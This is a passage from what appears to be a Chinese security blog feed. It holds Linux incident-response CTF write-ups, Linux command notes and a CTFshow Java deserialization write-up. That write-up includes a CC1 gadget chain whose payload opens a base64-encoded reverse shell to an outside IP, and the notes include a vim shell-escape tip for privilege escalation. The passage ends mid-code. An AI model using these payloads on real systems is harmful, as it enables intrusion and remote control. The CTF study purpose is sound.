20</code>,追踪TCP流,</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5Cfe491d001616c6ffe7076e3fdceeef15.png"></p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726734151764.png"></p><h2 id="攻击者使用的后续上传的木马文件名称"><a href="#攻击者使用的后续上传的木马文件名称" class="headerlink" title="攻击者使用的后续上传的木马文件名称"></a>攻击者使用的后续上传的木马文件名称</h2><p><code>ip.src == 192.168.20.1 &amp;&amp; ip.dst == 192.168.20.144 &amp;&amp; http</code>筛选</p><p><code>application/json, text/javascript, */*; q=0.01</code>特征,冰蝎的流量</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5Cdfa59d6a8067c874c2f909b251b6b01c.png"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>history里面能看到编辑了<code>mpnotify.php</code>和<code> alinotify.php</code>文件.flag3也看到了</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726735435593.jpg"></p><p><code>find / -name  alinotify.php</code>找文件.<code> cat /www/wwwroot/127.0.0.1/.api/alinotify.php</code>下</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5Cabfd861bdba607ddd3c9e1dad765d827.png"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>之前的history上都看到了</p><pre class="language-none"><code class="language-none">echo $flag3env | grep flagcat &#x2F;etc&#x2F;profile |grep flag</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应1</title>
      <link href="/2024/11/11/2024-09-18-Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%941/"/>
      <url>/2024/11/11/2024-09-18-Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%941/</url>
      
        <content type="html"><![CDATA[<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>目标：</p><pre class="language-none"><code class="language-none">1.攻击者IP地址2.三个flag(flag格式flag&#123;xxxxx&#125;)</code></pre><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><pre class="language-none"><code class="language-none">suhistory</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%941%5C1726652086338.jpg"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>历史命令编辑了<code>vim /etc/rc.d/rc.local</code>文件</p><pre class="language-none"><code class="language-none">cat &#x2F;etc&#x2F;rc.d&#x2F;rc.local</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%941%5C1726652218494.jpg"></p><p><code>/etc/rc.d/rc.local</code>：开机自启配置文件</p><p><code>/etc/rc.local</code>是<code>/etc/rc.d/rc.local</code>的软链接,同一个文件</p><pre class="language-none"><code class="language-none">ls -l &#x2F;etc&#x2F;rc.local</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%941%5C1726652340046.jpg"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>redis配置文件里面</p><pre class="language-none"><code class="language-none">cat &#x2F;etc&#x2F;redis.conf</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%941%5C1726661534213.jpg"></p><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>查看redis连接日志</p><pre class="language-none"><code class="language-none">cat &#x2F;var&#x2F;log&#x2F;redis&#x2F;redis.log | grep Accepted</code></pre><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%941%5C1726663087435.jpg"></p><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h5><p>last 命令用于显示用户最近登录信息.<code>192.168.75.129</code>异地登录<code>root</code></p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%941%5C1726662658968.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础</title>
      <link href="/2024/11/11/2024-09-18-Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/11/11/2024-09-18-Linux%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><pre class="language-none"><code class="language-none">&#x2F;bin：这个目录存放着最经常使用的命令。&#x2F;boot：这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。&#x2F;dev ：该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。&#x2F;etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。&#x2F;home：用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的&#x2F;lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。&#x2F;lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。&#x2F;media：linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。&#x2F;mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。&#x2F;opt：这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</code></pre><h2 id="文件和目录管理"><a href="#文件和目录管理" class="headerlink" title="文件和目录管理"></a>文件和目录管理</h2><h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><pre class="language-none"><code class="language-none">ls -ltotal 64dr-xr-xr-x   2 root root 4096 Dec 14  2012 bindr-xr-xr-x   4 root root 4096 Apr 19  2012 boot</code></pre><blockquote><p>当为 d 则是目录<br>当为 - 则是文件；<br>若是 l 则表示为链接文档(link file)；<br>若是 b 则表示为装置文件里面的可供储存的接口设备(可随机存取装置)；<br>若是 c 则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置)。</p><p><strong>r</strong> 代表可读、 <strong>w</strong> 代表可写、 <strong>x</strong> 代表可执行)如果没有权限，就会出现减号 <strong>-</strong> .</p><p>r:4 w:2 x:1</p></blockquote><h3 id="改变文件或目录的所有者和所属组"><a href="#改变文件或目录的所有者和所属组" class="headerlink" title="改变文件或目录的所有者和所属组"></a>改变文件或目录的所有者和所属组</h3><pre class="language-none"><code class="language-none">chown [选项] 所有者[:组] 文件名|目录名  chown [-R] 所有者:属组名 文件名</code></pre><h3 id="更改文件属组"><a href="#更改文件属组" class="headerlink" title="更改文件属组"></a>更改文件属组</h3><pre class="language-none"><code class="language-none">chgrp [-R] 属组名 文件名</code></pre><p>-R：递归更改文件属组</p><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><pre class="language-none"><code class="language-none">mkdir [-o] 目录</code></pre><p>-p:创建多级目录</p><h3 id="删除空目录"><a href="#删除空目录" class="headerlink" title="删除空目录"></a>删除空目录</h3><pre class="language-none"><code class="language-none">rmdir [-p] 目录名称</code></pre><p>-p:递归删除多级目录</p><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span></code></pre><h3 id="删除文件或目录"><a href="#删除文件或目录" class="headerlink" title="删除文件或目录"></a>删除文件或目录</h3><pre class="language-none"><code class="language-none">rm [-fir] 文件或目录</code></pre><p>-f ：忽略不存在的文件，不会出现警告信息；<br>-i ：互动模式，在删除前会询问使用者是否动作<br>-r ：递归删除</p><h3 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h3><pre class="language-none"><code class="language-none">mv </code></pre><p>-f:强制移动</p><p>-u:当源文件比目标文件新或者目标文件不存在时，才执行移动操作</p><h4 id="内容查看"><a href="#内容查看" class="headerlink" title="内容查看"></a>内容查看</h4><pre class="language-none"><code class="language-none">cat  由第一行开始显示文件内容tac  从最后一行开始显示，可以看出 tac 是 cat 的倒着写！nl   显示的时候，顺道输出行号！more 一页一页的显示文件内容less 与 more 类似，但是比 more 更好的是，他可以往前翻页！head 只看头几行tail 只看尾巴几行</code></pre><h4 id="Linux软硬链接"><a href="#Linux软硬链接" class="headerlink" title="Linux软硬链接"></a>Linux软硬链接</h4><p>硬链接:是允许一个文件拥有多个有效路径名,以防止“误删”的功能</p><p>软连接:软链接文件有类似于 Windows 的快捷方式</p><pre class="language-none"><code class="language-none">ln f1 f2          #创建f1的一个硬连接文件f2</code></pre><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><pre class="language-none"><code class="language-none">useradd 选项 用户名useradd -d &#x2F;data&#x2F;jane -m jane   目录不存在则创建</code></pre><p>-d ：指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录</p><p>-g ：指定用户所属的用户组</p><p>-G：指定用户所属的附加群组</p><p>-u：指定用户id</p><h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><pre class="language-none"><code class="language-none">userdel 选项 用户名userdel -r 用户名# userdel -r sam</code></pre><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><pre class="language-none"><code class="language-none">passwd [用户名]</code></pre><p><strong>passwd</strong>：用于修改用户密码。如果是普通用户执行，则只能修改自己的密码；如果是root用户执行，则可以修改任何用户的密码</p><h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><pre class="language-none"><code class="language-none">su [用户名]</code></pre><h2 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h2><h3 id="查看所属组"><a href="#查看所属组" class="headerlink" title="查看所属组"></a>查看所属组</h3><pre class="language-none"><code class="language-none">groups [用户名]</code></pre><h3 id="新增用户组"><a href="#新增用户组" class="headerlink" title="新增用户组"></a>新增用户组</h3><pre class="language-none"><code class="language-none">groupadd 选项 用户组groupadd -g 101 group2</code></pre><p>-g GID 指定新用户组的组标识号（GID）。</p><p>-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。</p><h3 id="删除用户组"><a href="#删除用户组" class="headerlink" title="删除用户组"></a>删除用户组</h3><pre class="language-none"><code class="language-none">groupdel 用户组</code></pre><h3 id="修改用户组的属性"><a href="#修改用户组的属性" class="headerlink" title="修改用户组的属性"></a>修改用户组的属性</h3><pre class="language-none"><code class="language-none">groupmod 选项 用户组</code></pre><p>-g GID 为用户组指定新的组标识号。<br>-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。<br>-n 新用户组 将用户组的名字改为新名字</p><p>切换用户组</p><pre class="language-none"><code class="language-none">newgrp root</code></pre><h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><h3 id="检查文件系统的磁盘空间占用情况"><a href="#检查文件系统的磁盘空间占用情况" class="headerlink" title="检查文件系统的磁盘空间占用情况"></a>检查文件系统的磁盘空间占用情况</h3><pre class="language-none"><code class="language-none">df  将系统内所有的文件系统列出来！</code></pre><h3 id="查看文件夹容量"><a href="#查看文件夹容量" class="headerlink" title="查看文件夹容量"></a>查看文件夹容量</h3><pre class="language-none"><code class="language-none">du   列出当前目录下的所有文件夹容量（包括隐藏文件夹）</code></pre><h3 id="vi-vim执行命令"><a href="#vi-vim执行命令" class="headerlink" title="vi&#x2F;vim执行命令"></a>vi&#x2F;vim执行命令</h3><pre class="language-none"><code class="language-none">:!ls  :!bash</code></pre><p>可用于提权</p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><pre class="language-none"><code class="language-none">ps</code></pre><p><code>-a</code> 显示当前终端运行的所有的进程信息<br><code>-u</code> 以用户的信息显示进程<br><code>-x</code> 显示后台运行进程的参数<br><code>ps -ef</code> 可以查看到父进程的信息<br><code>pstree -pu</code><br><code>-p</code> 显示父 id<br><code>-u</code> 显示用户组</p><h3 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h3><pre class="language-none"><code class="language-none">kill -9 [PID]</code></pre><h2 id="防火墙管理"><a href="#防火墙管理" class="headerlink" title="防火墙管理"></a>防火墙管理</h2><h3 id="firewalld"><a href="#firewalld" class="headerlink" title="firewalld"></a>firewalld</h3><h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><pre class="language-none"><code class="language-none">netstatnetstat -aptn</code></pre><p>-t : 指明显示TCP端口<br>-u : 指明显示UDP端口<br>-l : 仅显示监听套接字(LISTEN状态的套接字)<br>-p : 显示进程标识符和程序名称，每一个套接字&#x2F;端口都属于一个程序<br>-n : 不进行DNS解析<br>-a : 显示所有连接的端口</p><h4 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h4><pre class="language-none"><code class="language-none">firewall-cmd --zone&#x3D;public --add-port&#x3D;33306&#x2F;tcp --permanent</code></pre><p>–zone # 作用域<br>–add-port&#x3D;80&#x2F;tcp # 添加端口，格式为：端口&#x2F;通讯协议<br>–permanent # 永久生效，没有此参数重启后失效</p><h4 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h4><pre class="language-none"><code class="language-none">firewall-cmd --zone&#x3D;public --remove-port&#x3D;33306&#x2F;tcp --permanent</code></pre><h4 id="刷新设置"><a href="#刷新设置" class="headerlink" title="刷新设置"></a>刷新设置</h4><pre class="language-none"><code class="language-none">firewall-cmd --reload</code></pre><h4 id="重启防火墙"><a href="#重启防火墙" class="headerlink" title="重启防火墙"></a>重启防火墙</h4><pre class="language-none"><code class="language-none">systemctl restart firewalld</code></pre><h3 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h3><h4 id="开启防火墙"><a href="#开启防火墙" class="headerlink" title="开启防火墙"></a>开启防火墙</h4><pre class="language-none"><code class="language-none">ufw enable</code></pre><h4 id="重启防火墙-1"><a href="#重启防火墙-1" class="headerlink" title="重启防火墙"></a>重启防火墙</h4><pre class="language-none"><code class="language-none">ufw reload</code></pre><h4 id="开放端口-1"><a href="#开放端口-1" class="headerlink" title="开放端口"></a>开放端口</h4><pre class="language-none"><code class="language-none">ufw allow 22</code></pre><h4 id="查看端口规则"><a href="#查看端口规则" class="headerlink" title="查看端口规则"></a>查看端口规则</h4><pre class="language-none"><code class="language-none">ufw status</code></pre><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h3><pre class="language-none"><code class="language-none">printenvenvecho $PATH</code></pre><h3 id="临时环境变量"><a href="#临时环境变量" class="headerlink" title="临时环境变量"></a>临时环境变量</h3><pre class="language-none"><code class="language-none">export MY_VARIABLE&#x3D;valueexport PATH&#x3D;&quot;&#x2F;tmp:$PATH&quot;   #&#x2F;tmp 添加到 PATH 的最前面</code></pre><h3 id="永久添加"><a href="#永久添加" class="headerlink" title="永久添加"></a>永久添加</h3><pre class="language-none"><code class="language-none"># 打开 .bashrc 文件nano ~&#x2F;.bashrc# 在文件末尾添加环境变量export MY_VARIABLE&#x3D;value# 保存并关闭文件# 然后使更改生效source ~&#x2F;.bashrc</code></pre><h3 id="删除环境变量"><a href="#删除环境变量" class="headerlink" title="删除环境变量"></a>删除环境变量</h3><p>删除环境变量同样可以通过临时和永久两种方式来实现。</p><h3 id="临时删除"><a href="#临时删除" class="headerlink" title="临时删除"></a>临时删除</h3><pre class="language-none"><code class="language-none">unset MY_VARIABLE</code></pre><h3 id="永久删除："><a href="#永久删除：" class="headerlink" title="永久删除："></a>永久删除：</h3><pre class="language-none"><code class="language-none"># 打开 .bashrc 文件nano ~&#x2F;.bashrc# 删除或注释掉包含环境变量的行# export MY_VARIABLE&#x3D;value# 保存并关闭文件# 然后使更改生效source ~&#x2F;.bashrc</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-Java反序列化(846-853)</title>
      <link href="/2024/11/11/2024-09-18-CTFshow-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(846-853)/"/>
      <url>/2024/11/11/2024-09-18-CTFshow-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(846-853)/</url>
      
        <content type="html"><![CDATA[<h1 id="web846"><a href="#web846" class="headerlink" title="web846"></a>web846</h1><p>页面提示用dns查询，用之前的UrlDns链</p><p><img src="/%5Cimages%5Cposts%5CCTFshow-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5C1726485717659.jpg"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://8d6573b2-cb85-4a97-a273-de9a1196397a.challenge.ctf.show/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Class</span> c <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Field</span> hashCodefield <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hashCodefield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hashCodefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">"12313"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hashCodefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializedBytes <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> base64Encoded <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>serializedBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StringBuilder</span> encodedBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> base64Encoded<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        encodedBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">String</span> encodedURL <span class="token operator">=</span> encodedBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>encodedURL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="/%5Cimages%5Cposts%5CCTFshow-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5C1726485958121.jpg"></p><h1 id="web847"><a href="#web847" class="headerlink" title="web847"></a>web847</h1><p><strong>commons-collections 3.1</strong>可以用CC1链</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTYuMTIwLjIwNS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"admin123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> transformedMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//只需赋值valueTransformer</span>    <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span> annotationInvocationHandlerConstructor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token 